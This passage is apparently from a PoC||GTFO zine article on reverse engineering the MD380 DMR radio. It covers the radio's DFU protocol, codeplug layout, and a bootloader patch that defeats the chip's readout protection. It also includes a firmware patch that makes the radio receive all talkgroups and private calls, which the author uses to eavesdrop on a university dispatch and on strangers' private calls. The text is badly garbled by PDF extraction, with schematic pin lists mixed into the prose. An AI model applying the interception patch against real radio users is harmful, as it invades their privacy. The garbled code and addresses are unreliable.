that you fine readers can write your own strange and
clever software for this nifty gizmo. I also present
patches to promiscuously receive audio from un-
known talkgroups, creating the first hardware scan-
ner for DMR. Far more importantly, these notes
will be handy when you attempt to reverse engineer
something similar on your own.
This article does not go into the security prob-
lems of the DMR protocol, but those are sufficiently
59 unzip
60 The
MIC
The MD380 is a hand-held digital voice radio
that uses either analog FM or Digital Mobile Radio
(DMR). It is very similar to other DMR radios, such
as the CS700 and CS750 from Connect Systems. 60
DMR is a trunked radio protocol using two-slot
TDMA, so a single repeater tower can be used by
one user in Slot 1 while another user is having a
completely different conversation on Slot 2. Just
like GSM, the tower coordinates which radio should
transmit when.
The CPU of this radio is an STM32F405 from
STMicroelectronics. This contains a Cortex M4, so
all instructions are Thumb and all function point-
ers are odd. The LQFP100 package of this chip
is used. It has a megabyte of Flash and 192 kilo-
bytes of RAM. The STM32 has both JTAG and a
ROM bootloader, but both of these are protected
by a Readout Device Protection (RDP) feature. In
Section 8.8, I’ll show you how to bypass these pro-
tections and jailbreak your radio.
There is also a radio baseband chip, the
HR C5000. At first I was reconstructing the pinout
of this chip from the CS700 Service Manual, but the
full documentation can be had from DocIn, a Chi-
nese PDF sharing website.
Aside from a bunch of support components that
we can take for granted, there is an SPI Flash chip
for storing the codeplug. “Codeplug” is a Motorola
term for the radio settings, such as frequencies, con-
tacts, and talk groups; I use the term here to distin-
guish the radio configuration in SPI Flash from the
pocorgtfo10.pdf p25sec.pdf #from Proceedings of the 20th Usenix Security Symposium in 2011
folks at Connect Systems are nice and neighborly, so please buy a radio from them.
7662
DCDC_SW
63
3
61
HRC_5000
39
38
40
DVCC
RF_TX_EN
5
7
RF_RX_EN
U_SCLK
U_CS
9
11
U_SDI
DVDD
U_SDO
13
15
RF_RX_INTER
RF_TX_INTER
SYS_INTER
17
19
TIME_SLOT_INTER
NULL
PWD
21
23
RESETn
TESTMODE
DVSS
25
27
C_SDO
C_SCLK
29
iMac% d f u− u t i l −d 0 4 8 3 : d f 1 1 −−a l t 1 −s 0 : 0 x 2 0 0 0 0 0 −U
f i r s t 1 k . bin
F i l t e r on v e n d o r = 0 x 0 4 8 3 p r o d u c t = 0 x d f 1 1
Opening DFU c a p a b l e USB d e v i c e . . . ID 0 4 8 3 : d f 1 1
Run−t i m e d e v i c e DFU v e r s i o n 0 1 1 a
Found DFU : [ 0 4 8 3 : d f 1 1 ] devnum =0 , c f g =1 , i n t f =0 , a l t =1 ,
name="@SPI F l a s h Memory /0 x 0 0 0 0 0 0 0 0 / 1 6 ∗ 0 6 4Kg"
C l a i m i n g USB DFU I n t e r f a c e . . .
S e t t i n g A l t e r n a t e S e t t i n g #1 . . .
D e t e r m i n i n g d e v i c e s t a t u s : s t a t e = dfuUPLOAD−IDLE
aborting previous incomplete t r a n s f e r
D e t e r m i n i n g d e v i c e s t a t u s : s t a t e = dfuIDLE , s t a t u s = 0
dfuIDLE , c o n t i n u i n g
DFU mode d e v i c e DFU v e r s i o n 0 1 1 a
Device r e t u r n e d t r a n s f e r s i z e 1024
L i m i t i n g default upload to 2097152 bytes
b y t e s _ p e r _ h a s h =1024
S t a r t i n g u p l o a d : [####...####] f i n i s h e d !
iMac% hexdump f i r s t 1 k . b i n
0 0 0 0 0 0 0 30 1 a 00 20 15 56 00 08 29 54 00 08 2 b 54 00 08
0 0 0 0 0 1 0 2 d 54 00 08 2 f 54 00 08 31 54 00 08 00 00 00 00
0 0 0 0 0 2 0 00 00 00 00 00 00 00 00 00 00 00 00 33 54 00 08
0 0 0 0 0 3 0 35 54 00 08 00 00 00 00 83 30 00 08 37 54 00 08
0 0 0 0 0 4 0 61 56 00 08 65 56 00 08 69 56 00 08 5 b 54 00 08
...
0 0 0 0 3 c 0 10 eb 01 60 d f f 8 34 1 a 08 60 d f f 8 1 c 0 c 00 78
0 0 0 0 3 d0 40 28 c 0 f 0 e 6 81 d f f 8 24 0 a 00 68 00 f 0 0 e f f
0 0 0 0 3 e 0 d f e 1 d f f 8 10 1 a 09 78 a2 29 0 f d1 d f f 8 f 8 19
0 0 0 0 3 f 0 09 68 02 29 0 a d1 d f f 8 00 0 a 02 21 01 70 d f f 8
. . . [ same 1 0 2 4 b y t e s r e p e a t e d ]
C_CS
37
36
35
34
33
32
31
30
29
28
27
26
25
24
23
22
4
21
8.2
64
LRCK
DACDAT
65
BCLK
66
MCLK
ADCDAT
67
CKOut
68
XTALI
69
PLL_AVSS
70
PLL_AVCC
71
MICBIAS
72
LINEOUT
73
CDC_AVCC
74
MIC1_P
75
MIC2_P
MIC1_N
76
MIC2_N
77
CDC_VREF
78
HPGND
79
HPOUT
80
1
HPVCC
code and data in CPU Flash.
In this brave new world, where folks break their
bytes on the little side by order of Golbasto Mo-
marem Evlame Gurdilo Shefin Mully Ully Gue,
Tyrant of Lilliput and Eternal Enemy of Big En-
dians and Blefuscu, to break them on the little side,
it’s handy to spot four byte sequences that could be
interrupt handlers. In this case, what we’re looking
at is the first few pointers of an interrupt vector ta-
ble. This means that we are grabbing memory from
the beginning of internal flash at 0x08000000!
Note that the data repeats every kilobyte, and
also that dfu-util is reporting a transfer size of
1,024 bytes. The -t switch will order dfu-util to
dump more than a kilobyte per transfer, but every-
thing after the first transfer remains corrupted.
This is because dfu-util isn’t sending the
proper commands to the radio firmware, and it’s get-
ting the page as a bug rather than through proper
use of the protocol. (There are lots of weird variants
of DFU, created by folks only using DFU with their
own tools and never testing for compatibility with
each other. This variant is particularly weird, but
manageable.)
A Partial Dump
From lsusb -v on Linux, we can see that the de-
vice implements USB DFU, most likely as a fork of
some STMicro example code. The MD380 appears
as an STMicro DFU device with storage for Internal
Flash and SPI Flash with a VID:PID of 0483:df11.
1 iMac% dfu−u t i l − l i s t
Found DFU: [ 0 4 8 3 : d f 1 1 ]
3
devnum=0 , c f g =1 , i n t f =0 , a l t =0 ,
name=" @ I n t e r n a l F l a s h
5
/0 x08000000 /03∗016Kg"
Found DFU: [ 0 4 8 3 : d f 1 1 ]
7
devnum=0 , c f g =1 , i n t f =0 , a l t =1 ,
name="@SPI F l a s h Memory
9
/0 x00000000 /16∗064Kg"
Further, the .rdt codeplug files are SPI Flash
images in the DMU format, which is pretty much
just wrapper with a bare minimum of metadata
around a flat, uncompressed memory image. These
codeplug files contain the radio’s contact list, re-
peater frequencies, and other configuration info.
We’ll get back to this later, as what we really want
to do is dump and patch the firmware.
Unfortunately, dumping memory from the device
by the standard DFU protocol doesn’t seem to yield
useful results, just the same repeating binary string,
regardless of the alternate we choose or the starting
position.
8.3
Tapping USB with VMWare
Before going further, it was necessary to learn the
radio’s custom dialect of DFU. Since my Total Phase
USB sniffers weren’t nearby, I used VMWare to sniff
the transactions of both the MD380’s firmware up-
dater and codeplug configuration tools.
I did this by changing a few lines of my VMWare
.vmx configuration to dump USB transactions out
77to vmware.log, which I parsed with ugly regexes in
Python. These are the additions to the .vmx file.
Because I’m familiar with the code from a prior
target, I forked the DFU client from an old version
of Michael Ossmann’s Ubertooth project. 61
Sure enough, changing the VID and PID of the
ubertooth-dfu script was enough to start dumping
memory, but just like dfu-util, the result was a
repeating sequence of the first block’s contents. Be-
cause the block size was 256 bytes, I received only
the first 0x100 bytes repeated.
Adding support for the non-standard commands
in the same order as the official software, I got a
copy of the complete 256K codeplug from SPI Flash
instead of the beginning of Internal Flash. Hooray!
To upload a codeplug back into the radio, I mod-
ified the download() function to enable program-
ming mode and properly wait for the state to return
to dfuDNLOAD_IDLE before sending each block.
This was enough to write my own codeplug from
one radio into a second, but it had a nasty little bug!
I forgot to erase the codeplug memory, so the radio
got a bitwise AND of two valid codeplugs. 62
A second trip with the USB sniffer shows that
these four blocks were erased, and that the upload
address must be set to zero after the erasure.
0x00000000 0x00010000 0x00020000 0x00030000
Erasing the blocks properly gave me a tool that
correctly reads and writes the radio codeplug!
1 m o n i t o r = " debug "
usb . a n a l y z e r . e n a b l e = TRUE
3 usb . a n a l y z e r . maxLine = 8192
mouse . vusb . e n a b l e = FALSE
The logs showed that the MD380’s variant of
DFU included non-standard commands. In partic-
ular, the LCD screen would say “PC Program USB
Mode” for the official client applications, but not
for any 3rd party application. Before I could do a
proper read, I had to find the commands that would
enter this programming mode.
DFU normally hides extra commands in the
UPLOAD and DNLOAD commands when the block ad-
dress is less than two. (Hiding them in blocks
0xFFFF and 0xFFFE would make more sense, but if
wishes were horses, then beggars would ride.)
To erase a block, a DFU host sends 0x41 followed
by a little endian address. To set the address pointer
(block 2’s address), the host sends 0x21 followed by
a little endian address.
In addition to those standard commands, the
MD380 also uses a number of two-byte (rather than
five-byte) DNLOAD transactions, none of which exist
in the standard DMU protocol. I observed the fol-
lowing, which I still only partially understand.
91
a2
a2
a2
a2
a2
a2
91
91
8.5
Now that I could read and write the codeplug mem-
ory of my MD380, I wanted to be able to edit it.
Parts of the codeplug are nice and easy to reverse,
with strings as UTF16L and numbers being either
integers or BCD. Checksums don’t seem to matter,
and I’ve not yet been able to brick my radios by
uploading damaged firmware images.
The Radio Name is stored as a string at 0x20b0,
while the Radio ID Number is an integer at 0x2080.
The intro screen’s text is stored as two strings at
0x2040 and 0x2054.
Non-Standard DNLOAD Extensions
01 Enables programming mode on LCD.
01 Seems to return model number.
02 Sent only by config read.
31 Sent only by firmware update.
03 Sent by both.
04 Sent only by config read.
07 Sent by both.
31 Sent only by firmware update.
05 Reboots, exiting programming mode.
8.4
Custom Codeplug Client
Once I knew the extra commands, I built a custom
DFU client that would send them to read and write
codeplug memory. With a little luck, this might
have given me control of firmware, but as you’ll see,
it only got me half way.
Codeplug Format
#s e e k t o 0 x5F80 ;
2 struct {
ul24 c a l l i d ;
4
u8
flags ;
//DMR Account Number
// c2 p r i v a t e , no t o n e
// e1 group , w i t h r x t o n e
6
char name [ 3 2 ] ; //U16L c h a r s
} contacts [ 1 0 0 0 ] ;
61 In
particular, I used r543 of the old SVN repository, a version from 4 July 2012.
PoCkGTFO 2:5.
63 http://chirp.danplanet.com
62 See
78CHIRP, 63 a ham radio application for editing
radio codeplugs, has a bitwise library that expects
memory formats to be defined as C structs with base
addresses. By loading a bunch of contacts into my
radio and looking at the resulting structure, it was
easy to rewrite it for CHIRP.
Repeatedly changing the codeplug with the man-
ufacturer’s application, then comparing the hex-
dumps gave me most of the radio’s important fea-
tures. Patience and a few more rounds will give me
the rest of them, and then my CHIRP plugin can be
cleaned up for inclusion.
Unfortunately, not everything of importance ex-
ists within the codeplug. It would be nice to export
the call log or the text messages, but such commands
don’t exist and the messages themselves are nowhere
to be found inside of the codeplug. For that, we’ll
need to break into the firmware.
8.6
used for firmware updates, which can be started
by holding PTT and the unlabeled button above
it when turning on the power switch. 64
This trick doesn’t expose enough memory to
dump the application, but it was valuable to me for
two very important reasons. First, this bootloader
gave me some proper code to begin reverse engineer-
ing, instead of just external behavioral observations.
Second, the recovery bootloader contains the keys
and code needed to decrypt an application image,
but to get at that decrypted image, I first had to do
some soldering.
PE2
PE3
PE4
PE5
PE6
VBAT
PC13
PC14
PC15
VSS
VDD
PH0
PH1
NRST
PC0
PC1
PC2
PC3
VDD
VSSA
VREF+
VDDA
PA0
PA1
PA2
Dumping the Bootloader
Now that I had a working codeplug tool, I’d like a
cleartext dump of firmware. Recall from Section 8.2
that forgetting to send the custom command 0x91
0x01 leaves the radio in a state where the beginning
of code memory is returned for every read. This is
an interrupt table!
VDD
VSS
VCAP_2
PA13
PA12
PA11
PA10
PA9
PA8
PC9
PC8
PC7
PC6
PD15
PD14
PD13
PD12
PD11
PD10
PD9
PD8
PB15
PB14
PB13
PB12
PE7
PE8
PE9
8.7
Radio Disassembly (BOOT0 Pin)
As I stress elsewhere, the MD380 has three appli-
cations in it: (1) Tytera’s Radio Application, (2)
Tytera’s Recovery Bootloader, and (3) STMicro’s
Bootloader ROM. The default boot process is for
the Recovery Bootloader to immediately start the
Radio Application unless Push-To-Talk (PTT) and
the button above it are held during boot, in which
case it waits to accept a firmware update. There
is no key sequence to start the STMicro Bootloader
ROM, so a bit of disassembly and soldering is re-
quired.
This ROM contains commands to read and write
all of memory, as well as to begin execution at any
arbitrary address. These commands are initially
locked down, but in Section 8.8, I’ll show how to
get around the restrictions.
From this table and the STM32F405 datasheet,
we know the code flash begins at 0x08000000 and
RAM begins at 0x20000000. Because the firmware
updater only writes to regions at and after 0x0800-
C000, we can guess that the first 48k are a recovery
bootloader, with the region after that holding the
application firmware. As all of the interrupts are
odd, and because the radio uses a Cortex M4 core,
we know that the firmware is composed exclusively
of Thumb (and Thumb2) code, with no old fash-
ioned ARM instructions.
Sure enough, I was able to dump the whole boot-
loader by reading a single page of 0xC000 bytes from
the application mode. This bootloader is the one
64 Transfers
STFM32F405
LQFP100
75
74
73
72
71
70
69
68
67
66
65
64
63
62
61
60
59
58
57
56
55
54
53
52
51
36
37
MD380 Recovery Bootloader Interrupts
0x20001a30 Top of the call stack.
0x08005615 Reset Handler
0x08005429 Non-Maskable Interrupt (NMI)
0x0800542b Hard Fault
0x0800542d MMU Fault
0x0800542f Bus Fault
0x08005431 Usage Fault
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
this large work on Mac but not Linux.
79808.8
To open your radio, first remove the battery and
the four Torx screws that are visible from the back
of the device. Then unscrew the antenna and care-
fully pry off the two knob covers. Beneath each knob
and the antenna, there are rings that screw in place
to secure them against the radio case; these should
be moved by turning them counter-clockwise using
a pair of sturdy, dull tweezers.
Once the rings have been removed, the radio’s
main board can be levered up at the bottom of the
radio, then pulled out. Be careful when removing it,
as it is attached with a Zero Insertion Force (ZIF)
connector to the LCD/Keypad board, as well as by
a short connector to the speaker.
The STMicro Bootloader is started by pulling 1
the BOOT0 pin of the STM32F405 high while
3
restarting the radio. I did this by soldering a thin
wire to the test pad near that pin, wrapping the 5
wire around a screw for strain relief, then carefully
feeding it out through the microphone/speaker port. 7
(An alternate method involves removing 9
BOOT0’s pull-down resistor, then fly-wiring it to
the pull-up on the PTT button. Thanks to tricky 11
power management, this causes the radio to boot
normally, but to reboot into the Mask ROM.)
65 The
Bootloader RE
Once I finally had a dump of Tytera’s bootloader,
it was time to reverse engineer it. 65
The image is 48K in size and should be loaded to
0x08000000. Additionally, I placed 192K of RAM
at 0x20000000. It’s also handy to create regions for
the I/O banks of the chip, in order to help track
those accesses. (IDA and Radare2 will think that
peripherals are global variables near 0x40000000.)
After wasting a few days exploring the command
set, I had a decent, if imperfect, understanding of
the Tytera Bootloader but did not yet have a clear-
text copy of the application image. Getting a bit
impatient, I decided to patch the bootloader to keep
the device unprotected while loading the application
image using the official tools.
I had to first explore the STM32 Standard Pe-
ripheral Library to find the registers responsible for
locking the chip, then hunt for matching code.
/∗ STM32F4xx f l a s h r e g s from s t m 3 2 f 4 x x . h ∗/
#@0x40023c00
typedef struct {
__IO u i n t 3 2 _ t ACR;
// a c c e s s c t r l
0 x00
__IO u i n t 3 2 _ t KEYR;
// k e y
0 x04
__IO u i n t 3 2 _ t OPTKEYR; // o p t i o n k e y
0 x08
__IO u i n t 3 2 _ t SR ;
// s t a t u s
0x0C
__IO u i n t 3 2 _ t CR;
// c o n t r o l
0 x10
__IO u i n t 3 2 _ t OPTCR;
// o p t i o n c t r l
0 x14
__IO u i n t 3 2 _ t OPTCR1; // o p t i o n c t r l 1 0 x18
} FLASH ;
MD5 of my image is 721df1f98425b66954da8be58c7e5d55, but you might have a different one in your radio.
81The way flash protection works is that byte 1
of FLASH->OPTCR (at 0x40023C15) is set to the pro-
tection level. 0xAA is the unprotected state, while
0xCC is the permanent lock. Anything else, such as
0x55, is a sort of temporary lock that allows the
application to be wiped away by the Mask ROM
bootloader, but does not allow the application to be
read out.
1 /∗ S e t s t h e r e a d p r o t e c t i o n l e v e l .
∗ OB_RDP s p e c i f i e s t h e p r o t e c t i o n l e v e l .
3 ∗
AA: No p r o t e c t i o n .
∗
5 5 : Read p r o t e c t i o n memory .
5 ∗
CC: F u l l c h i p p r o t e c t i o n .
∗ WARNING: When e n a b l i n g OB_RDP l e v e l 2
7 ∗
i t ’ s no l o n g e r p o s s i b l e t o go
∗
b a c k t o l e v e l 1 or 0 .
9 ∗/
void FLASH_OB_RDPConfig( u i n t 8 _ t OB_RDP) {
11
FLASH_Status s t a t u s = FLASH_COMPLETE;
Tytera is using this semi-protected mode, so you
can pull the BOOT0 pin of the STM32F4xx chip high 13
to enter the Mask ROM bootloader. 66 This process 15
is described in Section 8.7.
17
Sure enough, at 0x08001FB0, I found a function 19
}
that’s very much like the example FLASH_OB_RDP-
Config function from stm32f4xx_flash.c. I call
the local variant rdp_lock().
/∗ Check t h e p a r a m e t e r s ∗/
assert_param (IS_OB_RDP(OB_RDP) ) ;
s t a t u s = FLASH_WaitForLastOperation ( ) ;
i f ( s t a t u s == FLASH_COMPLETE)
∗ (__IO u i n t 8 _ t ∗ )
OPTCR_BYTE1_ADDRESS = OB_RDP;
66 Confusingly enough, this is the third implementation of DFU for this project! The radio application, the recovery bootloader,
and the ROM bootloader all implement different variants of DFU. Take care not to confuse the them.
82The operating system for the application is an
ARM port of MicroC/OS-II, an embedded real-time
operating system that’s quite well documented in
the book of the same name by Jean J. Labrosse. A
large function at 0x0804429C that calls the operat-
ing system’s OSTaskCreateExt function to make a
baker’s dozen of threads. Each of these conveniently
has a name, conveniently describing the system in-
terrupt, the real-time clock timer, the RF PLL, and
other useful functions.
As I had already reverse engineered most of the
SPI Flash codeplug, it was handy to work backward
from codeplug addresses to identify function behav-
ior. I did this by identifying spiflash_read at
0x0802fd82 and spiflash_write at 0x0802fbea,
then tracing all calls to these functions. Once these
have been identified, finding codeplug functions is
easy. Knowing that the top line of startup text is 32
bytes stored at 0x2040 in the codeplug, finding the
code that prints the text is as simple as looking for
calls to spiflash_read(&foo, 0x2040, 20).
Thanks to the firmware author’s stubborn in-
sistence on 1-indexing, many of the structures in
the codeplug are indexed by an address just be-
fore the real one. For example, the list of ra-
dio channel settings is an array that begins at
0x1ee00, but the functions that access this array
have code along the lines of spiflash_read(&foo,
64*index+0x1edc0, 64).
One mystery that struck me when reverse engi-
neering the codeplug was that I didn’t find a missed
call list or any sent or received text messages. Sure
enough, the firmware shows that text messages are
stored after the end of the 256K image that the radio
exposes to the world.
Code that accesses the C5000 baseband chip can
be reverse engineered in a similar fashion to the
codeplug. The chip’s datasheet 67 is very well han-
dled by Google Translate, and plenty of dandy func-
tions can be identified by writes to C5000 registers
of similar functions.
Be careful to note that the C5000 has multiple
memories on its primary SPI bus; if you’re not care-
ful, you’ll confuse the registers, internal RAM, and
the Vocoder buffers. Also note that a lot of registers
are missing from the datasheet; please get in touch
with me if you happen to know what they do.
Finally, it is crucially important to be able to
sort through the DMR packet parsing and construc-
tion routines quickly. For this, I’ve found it handy
This function is called from main() with a pa-
rameter of 0x55 in the instruction at 0x080044A8.
2
,=<
4 |
|
6 |
|
8 |
‘−>
10
0 x080044a0
0 x080044a4
0 x080044a6
; Change t h i s
; to j a i l b r e a k
0 x080044a8
0 x080044aa
0 x080044ae
0 x080044b2
0 x080044b6
fdf7a0fd
bl r d p _ i s n o t l o c k e d
0028
cmp r 0 , 0
04 d1
bne 0 x 8 0 0 4 4 b 2
i m m e d i a t e from 0 x55 t o 0xAA
the bootloader.
5520
movs r 0 , 0 x55
fdf781fd
bl rdp_lock
fdf78bfd
bl rdp_applylock
fdf776fd
bl 0 x8001fa2
00 f 0 9 7 f a
bl bootloader_pin_test
Patching that instruction to instead send 0xAA
as a parameter prevents the bootloader from lock-
ing the device. (We’re just swapping aa 20 in where
55 20 used to be.)
iMac% d i f f o l d . t x t
2 < 00044 a0 f d f 7 a0
55 20 f d
4 −−−
> 00044 a0 f d f 7 a0
6
aa 20 f d
8.9
j a i l b r e a k . txt
f d 00 28 04 d1
f 7 81 f d f d f 7
f d 00 28 04 d1
f 7 81 f d f d f 7
Dumping the Application
Once I had a jailbroken version of the recovery boot-
loader, I flashed it to a development board and in-
stalled an encrypted MD380 firmware update using
the official Windows tool. Sure enough, the appli-
cation installed successfully!
After the update was installed, I rebooted the
board into its ROM by holding the BOOT0 pin high.
Since the recovery bootloader has been patched to
leave the chip unlocked, I was free to dump all of
Flash to a file for reverse engineering and patching.
8.10
Reversing the Application
Reverse engineering the application isn’t terribly dif-
ficult, provided a few tricks are employed. In this
section, I’ll share a few; note that all pointers in
this section are specific to Version 2.032, but similar
functionality exists in newer firmware revisions.
At the beginning, the image appears almost en-
tirely without symbols. Not one function or system
call comes with a name, but it’s easy to identify
a few strings and I/O ports. Starting from those,
related functions—those in the same .C source file—
are often located next to one another in memory,
providing hints as to their meaning.
67 unzip
pocorgtfo10.pdf hrc5000.pdf
83to keep paper printouts of the DMR standard, which
are freely available from ETSI. 68 Link-Local ad-
dresses (LLIDs) are 24 bits wide in DMR, and you
can often locate them by searching for code that
masks against 0xFFFFFF. 69
8.11
A similar JNE instruction at 0x0803ef10 can be
replaced with a NOP to enable promiscuous recep-
tion of private calls. Care in real-world patches
should be taken to reduce side effects, such as by
forcing a match only when there’s no correct match,
or by skipping the missed-call logic when promiscu-
ously receiving private calls.
Patching for Promiscuity
While it’s fun to reverse engineer code, it’s all a
bit pointless until we write a nifty patch. Complex
patches can be introduced by hooking function calls,
but let’s start with some useful patches that only re-
quire changing a couple of bits. Let’s enable promis-
cuous receive mode, so the MD380 can receive from
all talk groups on a known repeater and timeslot.
In DMR, audio is sent to either a Public Talk-
group or a Private Contact. These each have a 24-bit
LLID, and they are distinguished by a bit flag else-
where in the packet. For a concrete example, 3172 is
used for the Northeast Regional amateur talkgroup,
while 444 is used for the Bronx TRBO talkgroup. If
an unmodified MD380 is programmed for just 3172,
it won’t decode audio addressed to 444.
There is a function at 0x0803ec86 that takes a
DMR audio header as its first parameter and decides
whether to play the audio or mute it as addressed
to another group or user. I found it by looking for
access to the user’s local address, which is held in
RAM at 0x2001c65c, and the list of LLIDs for in-
coming listen addresses, stored at 0x2001c44c.
To enable promiscuous reception to unknown
talkgroups, the following talkgroup search routine
can be patched to always match on the first el-
ement of listengroup[]. This is accomplished
by changing the instruction at 0x0803ee36 from
0xd1ef (JNE) to 0x46c0 (NOP).
2
4
6
8
10
12
f o r ( i = 0 ; i < 0 x20u ; ++i ) {
i f ( ( l i s t e n g r o u p [ i ] & 0xFFFFFF)
== d s t _ l l i d _ a d r ) {
something = 1 6 ;
recognized_llid_dst = dst_llid_adr ;
c u r r e n t _ l l i d _ g r o u p = var_lgr oup [ i + 1 6 ] ;
sub_803EF6C ( ) ;
dmr_squelch_thing = 9 ;
i f ( ∗ ( v4 + 4 ) & 0 x80 )
byte_2001D0C0 |= 4u ;
break ;
}
}
8.12
DMR Scanning
After testing to ensure that my patches worked, I
used Radio Reference to find a few local DMR sta-
tions and write them into a codeplug for my mod-
ified MD380. Soon enough, I was hearing the best
gossip from a university’s radio dispatch. 70
Later, I managed to find a DMR network that
used the private calling feature. Sure enough, my
radio would ring as if I were the one being called,
and my missed call list quickly grew beyond my two
local friends with DMR radios.
8.13
A New Bootloader
Unfortunately, the MD380’s application consumes
all but the first 48K of Flash, and that 48K is con-
sumed by the recovery bootloader. Since we neigh-
bors have jailbroken radios with a ROM bootloader
accessible, we might as well wipe the Tytera boot-
loader and replace it with something completely
new, while keeping the application intact.
Luckily, the fine folks at Tytera have made
this easy for us! The application has its own
interrupt table at 0x0800C000, and the RESET
handler—whose address is stored at 0x0800C004—
automatically moved the interrupt table, cleans up
the stack, and performs other necessary chores.
1 // M i n i m a l i s t b o o t l o a d e r .
void main ( ) {
3
// Function p o i n t e r t o t h e a p p l i c a t i o n .
void ( ∗ appmain ) ( ) ;
5
//The h a n d l e r a d d r e s s i s t h e s t o r e d i n t h e
// i n t e r r u p t t a b l e .
7
uint32_t ∗ r e s e t h a n d l e r =
( u i n t 3 2 _ t ∗ ) 0 x0800C004 ;
9
// S e t t h e f u n c t i o n p o i n t e r t o t h a t v a l u e .
appmain = ( void ( ∗ ) ( ) ) ∗ r e s e t h a n d l e r ;
11
//Away we go !
appmain ( ) ;
13 }
68 ETSI
TS 102 361, Parts 1 to 4.
assembly, this looks like LSLS r0, r0, #8; LSRS r0, r0, #8.
70 Two days of scanning presented nothing more interesting than a damaged elevator and an undergrad too drunk to remember
his dorm room keys. Almost gives me some sympathy for those poor bastards who have to listen to wiretaps.
69 In
848.14
Firmware Distribution
–——–
———
—–—–
In this article, you have learned how to jailbreak
your MD380 radio, dump a copy of its application,
and begin patching that application or writing your
own, new application.
Perhaps you will add support for P25, D-Star,
or System Fusion. Perhaps you will write a proper
scanner, to identify unknown stations at a whim.
Perhaps you will make DMR adapter firmware, so
that a desktop could send and receiver DMR frames
in the raw over USB. If you do any of these things,
please tell me about it!
Since this article was written, DD4CR has managed
to free up 200K of the application by gutting the
Chinese font. She also broke the (terrible) update
encryption scheme, so patched or rewritten firmware
can be packaged to work with the official updater
tools from the manufacturer.
Patrick Hickey W7PCH has been playing around
with from-scratch firmware for this platform, built
around the FreeRTOS scheduler. His code is al-
ready linking into the memory that DD4CR freed
up, and it’s only a matter of time before fully-
functional community firmware can be dual-booted
on the MD380.
Your neighbor,
Travis
852
_D
K2
K
S0
SC
SH_
LA
CL
S
98
1
A1
3
86
1
3V3
R334
0R
C5000_RST
32.768K_OUT
32.768K_IN
100R DMR_CS
R309
32.768K_IN
100R DMR_SDO
PLL_CLK
DMR_SLEEP
R354
DMR_SCLK
R355
DMR_SDI
1K
R301
BSHIFT
PLL_DAT
C361
104
RF_TX_INTER
SYS_INTER
TIME_SLOT_INTER
RF_RX_INTER
TX_LED
1
1K
NC
R350
1K
LAMP
LCD_D1
BATT
R3
1K 32.768K_OUT
R348
V_CS
V_SCLK
V_SDO
V_SDI
FLASH_CS1
FLASH_CS2
PLL_LD
PLL_CS
LCD_RS
LCD_RST
LCD_D0
51
52
53
54
55
56
57
58
59
60
61
R308
49 C360
74 104
10
27
99
22
21
19
50
11
28
100
75
6
2T/5T
TP304
JTAG_SWDIO
1
PB12
PB13
PB14
PB15
PD8
PD9
PD10
PD11
PD12
PD13
PD14
VCAP_1
VSS_2
VSS_5
VSS_4
VSS_3
VDDA
VREF+
VDD
VDD_1
VDD_5
VDD_4
VDD_3
VDD_2
VBAT
PA8
PC9
PC8
PC7
PC6
PD15
PA1
PA0_WKUP
VREF-
PC3
PC2
PC1
PC0
VCAP_2
OSC_OUT
OSC_IN
PC15_OSC32_OUT
PC14_OSC32_IN
PC13_ANTI_TAMP
PE5
PE4
PE3
PE2
NRST
PE6
67
66
65
64
63
62
24
23
20
18
17
16
15
73
13
12
9
8
7
4
3
2
1
14
5
BEEP
G0
8
LED303
RED
SAVE
5RC
G0
7
LED301
GREEN2T/5T/DTMF_OUT
MIC_OUT
V_SDI
V_SDO
V_SCLK
V_CS
C5000_RST
DMR_SLEEP
+
C265
22U/10V
1
1
49
48
C_CS
C_SCLK
C_SDO
ADC_IVINP
6
7
11
5
8
20
46
54
40
47
31
30
29
28
27
26
25
24
23
22
MIC2_N
MIC1_N
MICBIAS
MIC2_P
MIC1_P
DACDAT
DBIST_OUT
VDD33
VDD33
PWD
STDBY_ENB
TX_RDY
RTS
PKT_RX_WAKE
MCBSP_FSR
MCBSP_CLKX
MCBSP_FSX
MCBSP_CLKR
MCBSP_TXD
MCBSP_RXD
VSS12
VSS12
VSS12
HPGND
PLL_VSS33
ADC_AGND_Q
ADC_AGND_I
DAC_AVSS33
DCDC_VSS
V_SDI
V_SDO
V_SCLK
V_CS
RF_RX_EN
RF_TX_EN
ADC_VBG_Q
XTAL
CLKOUT
ADC_QVINN
ADC_QVINP
21
33
52
3
13
65
68
73
78
41
42
43
44
59
60
61
14
15
62
63
879
Tithe us your Alms of 0day!
by Pastor Manul Laphroaig,
Unlicensed Proselytizer
International Church of the Weird Machines
Do this: write an email telling our editors how to
do reproduce ONE clever, technical trick from your
research. If you are uncertain of your English, we’ll
happily translate from French, Russian, Southern
Appalachian and German. If you don’t speak those
languages, we’ll draft a translator from those poor
sods who owe us favors.
Like an email, keep it short. Like an email, you
should assume that we already know more than a
bit about hacking, and that we’ll be insulted or—
WORSE!—that we’ll be bored if you include a long
tutorial where a quick reminder would do.
Just use 7-bit ASCII if your language doesn’t
require funny letters, as whenever we receive some-
thing typeset in OpenOffice, we briefly mistake it
for a ransom note. Don’t try to make it thorough
or broad. Don’t use bullet-points, as this isn’t a
damned Powerpoint deck. Keep your code samples
short and sweet; we can leave the long-form code as
an attachment. Do not send us L A TEX; it’s our job
to do the typesetting!
Do pick on quick, clever trick and explain it in a
few pages. Teach me how to repair Dakarand from
PoCkGTFO 1:2 and 2:9. Show me a fancy game in
a boot sector, like PoCkGTFO 3:8. Port the worst
features from Visual Basic to C, like PoCkGTFO
8:8. Don’t tell me that it’s possible; rather, teach
me how to do it myself with the absolute minimum
of formality and bullshit.
Like an email, we expect informal (or faux-
biblical) language and hand-sketched diagrams.
Write it in a single sitting, and leave any editing
for your poor preacherman to do over a bottle of
fine scotch. Send this to pastor@phrack org and
hope that the neighborly Phrack folks—praise be to
them!—aren’t man-in-the-middling our submission
process.
Howdy, neighbor!
One Sunday, a man and his son were hiking the
Appalachian Trail, when they came upon a small
church in rural New Hampshire. The boy insisted, so
the father begrudgingly attended the morning ser-
vice. Because he forgot to bring cash, the father
fished a dime out of his pocket for the collection
plate.
After the service, when they were walking back
to the woods, the father started griping. “The ser-
mon was too long,” he said, “and the hymns were off
key!”
After the few minutes of silence, the boy spoke
up. “Dad, I think it was pretty good for a dime!”
Yours in PoC and Pwnage,
Pastor Manul Laphroaig, D.D.
88PoC||GTFO
P
r
o
o
f
o
f
C
o
n
c
e
p
t
r
o
G
e
t
T
h
e
F
u
c
k
O
u
t
IN A FIT OF STUBBORN OPTIMISM,
